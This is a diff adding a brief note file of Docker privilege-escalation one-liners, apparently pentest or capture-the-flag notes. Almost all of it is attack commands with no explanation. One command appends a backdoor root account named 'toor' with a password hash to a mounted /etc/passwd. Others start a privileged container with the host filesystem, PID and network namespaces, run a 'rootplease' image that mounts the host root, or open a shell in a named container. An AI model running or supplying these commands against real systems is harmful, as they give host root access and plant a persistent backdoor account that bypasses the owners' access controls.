@@ -1,0 +1,20 @@
+docker run -it --rm -v $PWD:/mnt bash
+echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
+
+or
+
+docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash
+
+or
+
+docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
+
+or
+
+docker container ls
+docker exec
+docker exec --help
+docker exec -i -t donkeydocker /bin/bash
+
+(donkeydocker is the container name)
+
